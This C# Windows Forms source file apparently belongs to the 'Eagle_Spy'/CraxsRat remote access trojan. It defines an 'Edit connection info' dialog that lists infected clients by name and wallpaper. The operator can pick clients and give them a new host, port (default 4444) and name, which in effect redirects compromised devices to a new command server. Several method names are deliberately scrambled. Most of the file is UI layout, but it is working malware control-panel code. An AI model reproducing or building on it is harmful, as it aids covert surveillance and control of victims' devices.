using System;
using System.Collections;
using System.Collections.Generic;
using System.ComponentModel;
using System.Diagnostics;
using System.Drawing;
using System.Runtime.CompilerServices;
using System.Windows.Forms;
using Eagle_Spy.sockets;
using DrakeUI.Framework;
using Microsoft.VisualBasic.CompilerServices;

namespace Eagle_Spy;

[DesignerGenerated]
public class EditConnections : Form
{
	private IContainer components;

	[CompilerGenerated]
	[DebuggerBrowsable(DebuggerBrowsableState.Never)]
	[AccessedThroughProperty("DrakeUIAvatar1")]
	private DrakeUIAvatar _DrakeUIAvatar1;

	[CompilerGenerated]
	[DebuggerBrowsable(DebuggerBrowsableState.Never)]
	[AccessedThroughProperty("DrakeUIAvatar2")]
	private DrakeUIAvatar _DrakeUIAvatar2;

	public string NewHost;

	public string NewPort;

	public string NewName;

	public List<Client> listclients;

	public List<Client> SelectedList;

	[field: AccessedThroughProperty("Htext")]
	internal DrakeUITextBox Htext
	;

	internal DrakeUIAvatar DrakeUIAvatar1
	;

	[field: AccessedThroughProperty("DrakeUIToolTip1")]
	internal DrakeUIToolTip DrakeUIToolTip1
    ;

    [field: AccessedThroughProperty("Label2")]
	internal Label Label2
    ;

    [field: AccessedThroughProperty("Label1")]
	internal Label Label1
    ;

	internal DrakeUIAvatar DrakeUIAvatar2
	;

	[field: AccessedThroughProperty("Porttext")]
	internal DrakeUITextBox Porttext
    ;

    [field: AccessedThroughProperty("Label4")]
	internal Label Label4
    ;

    [field: AccessedThroughProperty("cliname")]
	internal DrakeUITextBox cliname
    ;

    [field: AccessedThroughProperty("DGVC")]
	internal DataGridView DGVC
    ;

    [field: AccessedThroughProperty("seleccli")]
	internal DataGridViewCheckBoxColumn seleccli
    ;

    [field: AccessedThroughProperty("cliico")]
	internal DataGridViewImageColumn cliico
    ;

    [field: AccessedThroughProperty("cliename")]
	internal DataGridViewTextBoxColumn cliename
    ;

    [field: AccessedThroughProperty("SplitContainer1")]
	internal SplitContainer SplitContainer1
    ;

    [field: AccessedThroughProperty("Label3")]
	internal Label Label3
    ;

    [DebuggerNonUserCode]
	protected override void Dispose(bool disposing)
	{
		try
		{
			if (disposing && components != null)
				components.Dispose();
		}
		finally
		{
			base.Dispose(disposing);
		}
	}

	[System.Diagnostics.DebuggerStepThrough]
	private void InitializeComponent()
	{
		this.components = new System.ComponentModel.Container();
		System.Windows.Forms.DataGridViewCellStyle dataGridViewCellStyle = new System.Windows.Forms.DataGridViewCellStyle();
		System.Windows.Forms.DataGridViewCellStyle dataGridViewCellStyle2 = new System.Windows.Forms.DataGridViewCellStyle();
		System.Windows.Forms.DataGridViewCellStyle dataGridViewCellStyle3 = new System.Windows.Forms.DataGridViewCellStyle();
		System.Windows.Forms.DataGridViewCellStyle dataGridViewCellStyle4 = new System.Windows.Forms.DataGridViewCellStyle();
		System.Windows.Forms.DataGridViewCellStyle dataGridViewCellStyle5 = new System.Windows.Forms.DataGridViewCellStyle();
		this.Htext = new DrakeUI.Framework.DrakeUITextBox();
		this.DrakeUIAvatar1 = new DrakeUI.Framework.DrakeUIAvatar();
		this.Label2 = new System.Windows.Forms.Label();
		this.Label1 = new System.Windows.Forms.Label();
		this.DrakeUIToolTip1 = new DrakeUI.Framework.DrakeUIToolTip(this.components);
		this.DrakeUIAvatar2 = new DrakeUI.Framework.DrakeUIAvatar();
		this.Porttext = new DrakeUI.Framework.DrakeUITextBox();
		this.Label4 = new System.Windows.Forms.Label();
		this.cliname = new DrakeUI.Framework.DrakeUITextBox();
		this.DGVC = new System.Windows.Forms.DataGridView();
		this.seleccli = new System.Windows.Forms.DataGridViewCheckBoxColumn();
		this.cliico = new System.Windows.Forms.DataGridViewImageColumn();
		this.cliename = new System.Windows.Forms.DataGridViewTextBoxColumn();
		this.SplitContainer1 = new System.Windows.Forms.SplitContainer();
		this.Label3 = new System.Windows.Forms.Label();
		((System.ComponentModel.ISupportInitialize)this.DGVC).BeginInit();
		((System.ComponentModel.ISupportInitialize)this.SplitContainer1).BeginInit();
		this.SplitContainer1.Panel1.SuspendLayout();
		this.SplitContainer1.Panel2.SuspendLayout();
		this.SplitContainer1.SuspendLayout();
		base.SuspendLayout();




        DrakeUIAvatar1.Click += new EventHandler(CraxsRatkfvuiorkenfudpajrsnCraxsRatszxcasd);
        DrakeUIAvatar2.Click += new EventHandler(DrakeUIAvatar2_Click);




















































        this.Htext.Cursor = System.Windows.Forms.Cursors.IBeam;
		this.Htext.FillColor = System.Drawing.Color.Black;
		this.Htext.Font = new System.Drawing.Font("Calibri", 12f);
		this.Htext.ForeColor = System.Drawing.Color.White;
		this.Htext.Location = new System.Drawing.Point(44, 234);
		this.Htext.Margin = new System.Windows.Forms.Padding(4, 5, 4, 5);
		this.Htext.Maximum = 2147483647.0;
		this.Htext.Minimum = -2147483648.0;
		this.Htext.Name = "Htext";
		this.Htext.Padding = new System.Windows.Forms.Padding(5);
		this.Htext.RectColor = System.Drawing.Color.FromArgb(255, 5, 17);
		this.Htext.RectDisableColor = System.Drawing.Color.FromArgb(227, 242, 253);
		this.Htext.Size = new System.Drawing.Size(220, 32);
		this.Htext.Style = DrakeUI.Framework.UIStyle.Custom;
		this.Htext.StyleCustomMode = true;
		this.Htext.TabIndex = 0;
		this.Htext.TextAlignment = System.Drawing.ContentAlignment.TopCenter;
		this.Htext.Watermark = "New Host or New ip";
		this.DrakeUIAvatar1.AvatarSize = 30;
		this.DrakeUIAvatar1.Cursor = System.Windows.Forms.Cursors.Hand;
		this.DrakeUIAvatar1.FillColor = System.Drawing.Color.Black;
		this.DrakeUIAvatar1.Font = new System.Drawing.Font("Calibri", 12f);
		this.DrakeUIAvatar1.ForeColor = System.Drawing.Color.FromArgb(255, 5, 17);
		this.DrakeUIAvatar1.Location = new System.Drawing.Point(204, 438);
		this.DrakeUIAvatar1.Name = "DrakeUIAvatar1";
		this.DrakeUIAvatar1.Size = new System.Drawing.Size(60, 60);
		this.DrakeUIAvatar1.Style = DrakeUI.Framework.UIStyle.Custom;
		this.DrakeUIAvatar1.Symbol = 61639;
		this.DrakeUIAvatar1.SymbolSize = 30;
		this.DrakeUIAvatar1.TabIndex = 2;
		this.DrakeUIAvatar1.Text = "DrakeUIAvatar1";
		this.DrakeUIToolTip1.SetToolTip(this.DrakeUIAvatar1, "Save");
		this.Label2.AutoSize = true;
		this.Label2.BackColor = System.Drawing.Color.Transparent;
		this.Label2.Font = new System.Drawing.Font("Calibri", 12f, System.Drawing.FontStyle.Bold);
		this.Label2.ForeColor = System.Drawing.Color.FromArgb(255, 5, 17);
		this.Label2.Location = new System.Drawing.Point(40, 323);
		this.Label2.Margin = new System.Windows.Forms.Padding(4, 0, 4, 0);
		this.Label2.Name = "Label2";
		this.Label2.Size = new System.Drawing.Size(46, 24);
		this.Label2.TabIndex = 20;
		this.Label2.Text = "Port";
		this.Label1.AutoSize = true;
		this.Label1.BackColor = System.Drawing.Color.Transparent;
		this.Label1.Font = new System.Drawing.Font("Calibri", 12f, System.Drawing.FontStyle.Bold);
		this.Label1.ForeColor = System.Drawing.Color.FromArgb(255, 5, 17);
		this.Label1.Location = new System.Drawing.Point(40, 205);
		this.Label1.Margin = new System.Windows.Forms.Padding(4, 0, 4, 0);
		this.Label1.Name = "Label1";
		this.Label1.Size = new System.Drawing.Size(49, 24);
		this.Label1.TabIndex = 21;
		this.Label1.Text = "Host";
		this.DrakeUIToolTip1.BackColor = System.Drawing.Color.FromArgb(54, 54, 54);
		this.DrakeUIToolTip1.ForeColor = System.Drawing.Color.FromArgb(239, 239, 239);
		this.DrakeUIToolTip1.OwnerDraw = true;
		this.DrakeUIAvatar2.AvatarSize = 30;
		this.DrakeUIAvatar2.Cursor = System.Windows.Forms.Cursors.Hand;
		this.DrakeUIAvatar2.FillColor = System.Drawing.Color.Black;
		this.DrakeUIAvatar2.Font = new System.Drawing.Font("Calibri", 12f);
		this.DrakeUIAvatar2.ForeColor = System.Drawing.Color.FromArgb(255, 5, 17);
		this.DrakeUIAvatar2.Location = new System.Drawing.Point(44, 438);
		this.DrakeUIAvatar2.Name = "DrakeUIAvatar2";
		this.DrakeUIAvatar2.Size = new System.Drawing.Size(60, 60);
		this.DrakeUIAvatar2.Style = DrakeUI.Framework.UIStyle.Custom;
		this.DrakeUIAvatar2.Symbol = 61453;
		this.DrakeUIAvatar2.SymbolSize = 30;
		this.DrakeUIAvatar2.TabIndex = 22;
		this.DrakeUIAvatar2.Text = "DrakeUIAvatar2";
		this.DrakeUIToolTip1.SetToolTip(this.DrakeUIAvatar2, "Cancel");
		this.Porttext.Cursor = System.Windows.Forms.Cursors.IBeam;
		this.Porttext.DoubleValue = 4444.0;
		this.Porttext.FillColor = System.Drawing.Color.Black;
		this.Porttext.Font = new System.Drawing.Font("Calibri", 12f);
		this.Porttext.ForeColor = System.Drawing.Color.White;
		this.Porttext.IntValue = 4444;
		this.Porttext.Location = new System.Drawing.Point(44, 352);
		this.Porttext.Margin = new System.Windows.Forms.Padding(4, 5, 4, 5);
		this.Porttext.Maximum = 2147483647.0;
		this.Porttext.Minimum = -2147483648.0;
		this.Porttext.Name = "Porttext";
		this.Porttext.Padding = new System.Windows.Forms.Padding(5);
		this.Porttext.RectColor = System.Drawing.Color.FromArgb(255, 5, 17);
		this.Porttext.RectDisableColor = System.Drawing.Color.FromArgb(227, 242, 253);
		this.Porttext.Size = new System.Drawing.Size(220, 32);
		this.Porttext.Style = DrakeUI.Framework.UIStyle.Custom;
		this.Porttext.StyleCustomMode = true;
		this.Porttext.TabIndex = 25;
		this.Porttext.Text = "4444";
		this.Porttext.TextAlignment = System.Drawing.ContentAlignment.TopCenter;
		this.Porttext.Type = DrakeUI.Framework.DrakeUITextBox.UIEditType.Integer;
		this.Porttext.Watermark = "New Port";
		this.Label4.AutoSize = true;
		this.Label4.BackColor = System.Drawing.Color.Transparent;
		this.Label4.Font = new System.Drawing.Font("Calibri", 12f, System.Drawing.FontStyle.Bold);
		this.Label4.ForeColor = System.Drawing.Color.FromArgb(255, 5, 17);
		this.Label4.Location = new System.Drawing.Point(40, 80);
		this.Label4.Margin = new System.Windows.Forms.Padding(4, 0, 4, 0);
		this.Label4.Name = "Label4";
		this.Label4.Size = new System.Drawing.Size(59, 24);
		this.Label4.TabIndex = 27;
		this.Label4.Text = "Name";
		this.cliname.Cursor = System.Windows.Forms.Cursors.IBeam;
		this.cliname.FillColor = System.Drawing.Color.Black;
		this.cliname.Font = new System.Drawing.Font("Calibri", 12f);
		this.cliname.ForeColor = System.Drawing.Color.White;
		this.cliname.Location = new System.Drawing.Point(44, 109);
		this.cliname.Margin = new System.Windows.Forms.Padding(4, 5, 4, 5);
		this.cliname.Maximum = 2147483647.0;
		this.cliname.Minimum = -2147483648.0;
		this.cliname.Name = "cliname";
		this.cliname.Padding = new System.Windows.Forms.Padding(5);
		this.cliname.RectColor = System.Drawing.Color.FromArgb(255, 5, 17);
		this.cliname.RectDisableColor = System.Drawing.Color.FromArgb(227, 242, 253);
		this.cliname.Size = new System.Drawing.Size(220, 32);
		this.cliname.Style = DrakeUI.Framework.UIStyle.Custom;
		this.cliname.StyleCustomMode = true;
		this.cliname.TabIndex = 26;
		this.cliname.TextAlignment = System.Drawing.ContentAlignment.TopCenter;
		this.cliname.Watermark = "Client name";
		this.DGVC.AllowUserToAddRows = false;
		this.DGVC.AllowUserToDeleteRows = false;
		this.DGVC.AllowUserToResizeColumns = false;
		this.DGVC.AllowUserToResizeRows = false;
		dataGridViewCellStyle.BackColor = System.Drawing.Color.Black;
		dataGridViewCellStyle.ForeColor = System.Drawing.Color.White;
		dataGridViewCellStyle.SelectionBackColor = System.Drawing.Color.White;
		dataGridViewCellStyle.SelectionForeColor = System.Drawing.Color.Black;
		this.DGVC.AlternatingRowsDefaultCellStyle = dataGridViewCellStyle;
		this.DGVC.AutoSizeColumnsMode = System.Windows.Forms.DataGridViewAutoSizeColumnsMode.Fill;
		this.DGVC.AutoSizeRowsMode = System.Windows.Forms.DataGridViewAutoSizeRowsMode.AllCells;
		this.DGVC.BackgroundColor = System.Drawing.Color.Black;
		dataGridViewCellStyle2.Alignment = System.Windows.Forms.DataGridViewContentAlignment.MiddleLeft;
		dataGridViewCellStyle2.BackColor = System.Drawing.Color.Black;
		dataGridViewCellStyle2.Font = new System.Drawing.Font("Calibri", 7.8f, System.Drawing.FontStyle.Regular, System.Drawing.GraphicsUnit.Point, 0);
		dataGridViewCellStyle2.ForeColor = System.Drawing.Color.White;
		dataGridViewCellStyle2.SelectionBackColor = System.Drawing.Color.White;
		dataGridViewCellStyle2.SelectionForeColor = System.Drawing.Color.Black;
		dataGridViewCellStyle2.WrapMode = System.Windows.Forms.DataGridViewTriState.True;
		this.DGVC.ColumnHeadersDefaultCellStyle = dataGridViewCellStyle2;
		this.DGVC.ColumnHeadersHeightSizeMode = System.Windows.Forms.DataGridViewColumnHeadersHeightSizeMode.AutoSize;
		this.DGVC.ColumnHeadersVisible = false;
		this.DGVC.Columns.AddRange(this.seleccli, this.cliico, this.cliename);
		dataGridViewCellStyle3.Alignment = System.Windows.Forms.DataGridViewContentAlignment.MiddleLeft;
		dataGridViewCellStyle3.BackColor = System.Drawing.Color.Black;
		dataGridViewCellStyle3.Font = new System.Drawing.Font("Calibri", 7.8f, System.Drawing.FontStyle.Regular, System.Drawing.GraphicsUnit.Point, 0);
		dataGridViewCellStyle3.ForeColor = System.Drawing.Color.White;
		dataGridViewCellStyle3.SelectionBackColor = System.Drawing.Color.White;
		dataGridViewCellStyle3.SelectionForeColor = System.Drawing.Color.Black;
		dataGridViewCellStyle3.WrapMode = System.Windows.Forms.DataGridViewTriState.False;
		this.DGVC.DefaultCellStyle = dataGridViewCellStyle3;
		this.DGVC.Dock = System.Windows.Forms.DockStyle.Fill;
		this.DGVC.GridColor = System.Drawing.Color.Black;
		this.DGVC.Location = new System.Drawing.Point(0, 0);
		this.DGVC.Name = "DGVC";
		this.DGVC.ReadOnly = true;
		dataGridViewCellStyle4.Alignment = System.Windows.Forms.DataGridViewContentAlignment.MiddleLeft;
		dataGridViewCellStyle4.BackColor = System.Drawing.Color.Black;
		dataGridViewCellStyle4.Font = new System.Drawing.Font("Calibri", 7.8f, System.Drawing.FontStyle.Regular, System.Drawing.GraphicsUnit.Point, 0);
		dataGridViewCellStyle4.ForeColor = System.Drawing.Color.White;
		dataGridViewCellStyle4.SelectionBackColor = System.Drawing.Color.White;
		dataGridViewCellStyle4.SelectionForeColor = System.Drawing.Color.Black;
		dataGridViewCellStyle4.WrapMode = System.Windows.Forms.DataGridViewTriState.True;
		this.DGVC.RowHeadersDefaultCellStyle = dataGridViewCellStyle4;
		this.DGVC.RowHeadersVisible = false;
		dataGridViewCellStyle5.BackColor = System.Drawing.Color.Black;
		dataGridViewCellStyle5.ForeColor = System.Drawing.Color.White;
		dataGridViewCellStyle5.SelectionBackColor = System.Drawing.Color.White;
		dataGridViewCellStyle5.SelectionForeColor = System.Drawing.Color.Black;
		this.DGVC.RowsDefaultCellStyle = dataGridViewCellStyle5;
		this.DGVC.RowTemplate.Height = 24;
		this.DGVC.SelectionMode = System.Windows.Forms.DataGridViewSelectionMode.FullRowSelect;
		this.DGVC.Size = new System.Drawing.Size(637, 510);
		this.DGVC.TabIndex = 28;
		this.seleccli.FillWeight = 67.85324f;
		this.seleccli.HeaderText = "selectme";
		this.seleccli.Name = "seleccli";
		this.seleccli.ReadOnly = true;
		this.cliico.FillWeight = 98.98477f;
		this.cliico.HeaderText = "icon";
		this.cliico.Name = "cliico";
		this.cliico.ReadOnly = true;
		this.cliename.FillWeight = 133.162f;
		this.cliename.HeaderText = "Name";
		this.cliename.Name = "cliename";
		this.cliename.ReadOnly = true;
		this.SplitContainer1.Dock = System.Windows.Forms.DockStyle.Fill;
		this.SplitContainer1.Location = new System.Drawing.Point(0, 0);
		this.SplitContainer1.Name = "SplitContainer1";
		this.SplitContainer1.Panel1.Controls.Add(this.Label3);
		this.SplitContainer1.Panel1.Controls.Add(this.cliname);
		this.SplitContainer1.Panel1.Controls.Add(this.DrakeUIAvatar2);
		this.SplitContainer1.Panel1.Controls.Add(this.DrakeUIAvatar1);
		this.SplitContainer1.Panel1.Controls.Add(this.Label4);
		this.SplitContainer1.Panel1.Controls.Add(this.Htext);
		this.SplitContainer1.Panel1.Controls.Add(this.Label2);
		this.SplitContainer1.Panel1.Controls.Add(this.Porttext);
		this.SplitContainer1.Panel1.Controls.Add(this.Label1);
		this.SplitContainer1.Panel2.Controls.Add(this.DGVC);
		this.SplitContainer1.Size = new System.Drawing.Size(961, 510);
		this.SplitContainer1.SplitterDistance = 320;
		this.SplitContainer1.TabIndex = 29;
		this.Label3.BackColor = System.Drawing.Color.Transparent;
		this.Label3.Dock = System.Windows.Forms.DockStyle.Top;
		this.Label3.Font = new System.Drawing.Font("Calibri", 12f, System.Drawing.FontStyle.Bold);
		this.Label3.ForeColor = System.Drawing.Color.FromArgb(255, 5, 17);
		this.Label3.Location = new System.Drawing.Point(0, 0);
		this.Label3.Margin = new System.Windows.Forms.Padding(4, 0, 4, 0);
		this.Label3.Name = "Label3";
		this.Label3.Size = new System.Drawing.Size(320, 64);
		this.Label3.TabIndex = 28;
		this.Label3.Text = "Edit connection info";
		this.Label3.TextAlign = System.Drawing.ContentAlignment.MiddleCenter;
		base.AutoScaleDimensions = new System.Drawing.SizeF(8f, 16f);
		base.AutoScaleMode = System.Windows.Forms.AutoScaleMode.Font;
		this.BackColor = System.Drawing.Color.Black;
		base.ClientSize = new System.Drawing.Size(961, 510);
		base.ControlBox = false;
		base.Controls.Add(this.SplitContainer1);
		this.ForeColor = System.Drawing.Color.White;
		base.FormBorderStyle = System.Windows.Forms.FormBorderStyle.FixedToolWindow;
		base.Name = "EditConnections";
		base.ShowIcon = false;
		base.ShowInTaskbar = false;
		this.Text = "EditConnections";
		base.TopMost = true;
		((System.ComponentModel.ISupportInitialize)this.DGVC).EndInit();
		this.SplitContainer1.Panel1.ResumeLayout(false);
		this.SplitContainer1.Panel1.PerformLayout();
		this.SplitContainer1.Panel2.ResumeLayout(false);
		((System.ComponentModel.ISupportInitialize)this.SplitContainer1).EndInit();
		this.SplitContainer1.ResumeLayout(false);
		base.ResumeLayout(false);
	}

	public void CraxsRatkfvuiorkenfudpajrsnCraxsRatslkasbtxi(List<Client> L)
	{
		InitializeComponent();
		listclients = L;
	}

	private void translateme()
	{
		string language = RegistryHandler.Get_Language();
		if (Operators.CompareString(language, "AR", TextCompare: false) != 0)
		{
			if (Operators.CompareString(language, "CN", TextCompare: false) == 0)
			{
				Label1.Text = Codes.Translate(Label1.Text, "en", "zh");
				Label2.Text = Codes.Translate(Label2.Text, "en", "zh");
				Label3.Text = Codes.Translate(Label3.Text, "en", "zh");
				Label4.Text = Codes.Translate(Label4.Text, "en", "zh");
				cliname.Watermark = Codes.Translate(cliname.Watermark, "en", "zh");
				Htext.Watermark = Codes.Translate(Htext.Watermark, "en", "zh");
			}
		}
		else
		{
			Label1.Text = Codes.Translate(Label1.Text, "en", "ar");
			Label2.Text = Codes.Translate(Label2.Text, "en", "ar");
			Label3.Text = Codes.Translate(Label3.Text, "en", "ar");
			Label4.Text = Codes.Translate(Label4.Text, "en", "ar");
			cliname.Watermark = Codes.Translate(cliname.Watermark, "en", "ar");
			Htext.Watermark = Codes.Translate(Htext.Watermark, "en", "ar");
		}
	}

	public EditConnections(List<Client> L)
	{
		base.Load += EditConnections_Load;
		NewHost = "";
		NewPort = "";
		NewName = "";
		listclients = new List<Client>();
		SelectedList = new List<Client>();
		CraxsRatkfvuiorkenfudpajrsnCraxsRatslkasbtxi(L);
	}

	private void CraxsRatkfvuiorkenfudpajrsnCraxsRatszxcasd(object sender, EventArgs e)
	{
		if (string.IsNullOrEmpty(Htext.Text) | string.IsNullOrWhiteSpace(Htext.Text))
		{
			CraxsAlert.ShowWarning("Enter Host Name First");
			return;
		}
		NewHost = Htext.Text;
		NewPort = Porttext.Text;
		NewName = cliname.Text;
		if (DGVC.Rows.Count > 0)
		{
			foreach (DataGridViewRow item in (IEnumerable)DGVC.Rows)
			{
				try
				{
					SelectedList.Add((Client)item.Tag);
				}
				catch (Exception)
				{
					//ProjectData.SetProjectError(projectError);
					//////CraxsAlert.Showinformation("Sorry");
				}
			}
		}
		base.DialogResult = DialogResult.OK;
		Close();
	}

	private void DrakeUIAvatar2_Click(object sender, EventArgs e)
	{
		base.DialogResult = DialogResult.No;
		Close();
	}

	private void EditConnections_Load(object sender, EventArgs e)
	{
		translateme();
		if (listclients.Count <= 0)
			return;
		foreach (Client listclient in listclients)
		{
			int index = DGVC.Rows.Add(true, listclient.Wallpaper, listclient.ClientName);
			DGVC.Rows[index].Tag = listclient;
		}
	}
}
